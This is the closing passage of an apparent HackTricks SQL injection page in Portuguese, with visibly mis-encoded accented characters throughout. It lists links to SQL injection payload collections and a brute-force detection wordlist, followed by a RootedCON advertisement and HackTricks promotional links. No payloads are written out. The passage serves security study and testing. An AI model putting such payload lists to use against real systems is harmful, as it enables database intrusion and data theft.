* [https://sqlwiki.netspi.com/](https://sqlwiki.netspi.com)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## Lista de Detec√ß√£o de For√ßa Bruta

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt" %}



‚Äã

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) √© o evento de ciberseguran√ßa mais relevante na **Espanha** e um dos mais importantes na **Europa**. Com **a miss√£o de promover conhecimento t√©cnico**, este congresso √© um ponto de encontro fervilhante para profissionais de tecnologia e ciberseguran√ßa em todas as disciplinas.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Gostaria de ver sua **empresa anunciada no HackTricks**? ou gostaria de ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me no** **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [reposit√≥rio hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
